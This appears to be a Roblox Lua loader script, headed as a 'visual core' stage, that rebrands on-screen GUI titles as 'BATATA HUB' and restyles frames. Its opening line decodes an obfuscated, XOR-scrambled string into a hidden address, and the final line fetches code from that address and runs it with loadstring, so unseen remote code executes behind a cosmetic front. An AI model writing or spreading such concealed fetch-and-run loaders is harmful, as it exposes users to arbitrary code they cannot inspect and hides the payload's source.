
--[[ STAGE 2: VISUAL CORE ]]
local mEidHtFPR3ghH="\035\048\049\062\050\010\112\113\051\037\200\202\060\058\050\200\009\063\204\203\014\194\050\217\002\206\024\048\034\046\195\223\038"local h7h5BDGcBUmWbjSJWl_=72 local XMGKfqulxUwMSPJQoPEt=240 local lFfVKpOrELWiw9J=1 local vRv8Hyjkqj1XDEDt75=1 local pqfA0MJiP2adVxH=18 local saAn5hw5Ebid1__8v_I=false local GbrbDb5eaFgpy=bit32 and bit32.bxor if not GbrbDb5eaFgpy then GbrbDb5eaFgpy=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local VrEhyl0nHfWp9y={}for _bThctk8oYzFac1p6=1,#mEidHtFPR3ghH do local z_gjnhUyy5ad_7Y=string.byte(mEidHtFPR3ghH,_bThctk8oYzFac1p6)local n34XGayYs2SxloOCn79DK=(XMGKfqulxUwMSPJQoPEt+(_bThctk8oYzFac1p6*vRv8Hyjkqj1XDEDt75)+pqfA0MJiP2adVxH)%256 if lFfVKpOrELWiw9J==0 then z_gjnhUyy5ad_7Y=(z_gjnhUyy5ad_7Y-n34XGayYs2SxloOCn79DK)%256 VrEhyl0nHfWp9y[_bThctk8oYzFac1p6]=string.char(GbrbDb5eaFgpy(z_gjnhUyy5ad_7Y,h7h5BDGcBUmWbjSJWl_))else z_gjnhUyy5ad_7Y=GbrbDb5eaFgpy(z_gjnhUyy5ad_7Y,h7h5BDGcBUmWbjSJWl_)VrEhyl0nHfWp9y[_bThctk8oYzFac1p6]=string.char((z_gjnhUyy5ad_7Y-n34XGayYs2SxloOCn79DK)%256)end end local OzO5NqpcawtMVpLP2=table.concat(VrEhyl0nHfWp9y)if saAn5hw5Ebid1__8v_I then OzO5NqpcawtMVpLP2=string.reverse(OzO5NqpcawtMVpLP2)end local xKJwK8Imny0vneVX=OzO5NqpcawtMVpLP2
local HubName = "BATATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(xKJwK8Imny0vneVX))()
